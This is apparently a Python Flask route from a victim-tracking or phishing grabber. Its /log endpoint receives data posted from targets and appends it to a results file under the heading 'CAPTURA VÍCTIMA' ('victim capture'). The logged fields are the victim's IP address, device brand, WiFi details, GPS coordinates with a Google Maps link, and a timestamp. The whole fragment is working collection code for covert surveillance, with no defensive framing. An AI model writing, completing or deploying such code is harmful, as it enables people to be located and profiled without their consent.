@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    with open("resultados.txt", "a") as f:
        f.write(f"\n[!] CAPTURA VÍCTIMA\nIP: {ip}\nMARCA: {d.get('marca')}\nCAL: {d.get('cal')}\nWIFI: {d.get('wifi')}\nCOORD: {d.get('lat', 'NO')}, {d.get('lon', 'NO')}\nMAPA: https://maps.google.com/?q={d.get('lat',0)},{d.get('lon',0)}\nHORA: {d.get('time')}\n--------------------\n")
    return "OK"

